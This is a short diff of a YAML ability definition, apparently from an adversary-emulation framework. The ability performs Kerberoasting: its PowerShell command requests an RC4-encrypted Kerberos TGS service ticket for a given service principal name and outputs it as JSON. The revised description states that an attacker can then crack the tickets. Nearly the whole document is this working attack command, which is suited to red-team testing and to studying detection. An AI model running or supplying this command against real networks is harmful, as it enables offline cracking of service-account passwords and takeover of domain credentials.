@@ -1,6 +1,6 @@
 id: fd8f1dfe-9ab2-4a60-9f75-810472d9bb22
 name: Request RC4 encrypted Kerberos TGS Service Ticket 
-description: Retrieves RC4 encrypted Kerberos TGS for a given SPN
+description: Retrieves RC4 encrypted Kerberos TGS for a given SPN for further extraction, then attacker can crack them.
 metadata:
   version: 1
   authors:
@@ -15,4 +15,4 @@ platforms:
     psh:
       command: |
         Add-Type -AssemblyName System.IdentityModel
-        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '#{discover.spn}'
+        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '#{json.T1087.002.ServicePrincipalName}' | ConvertTo-Json
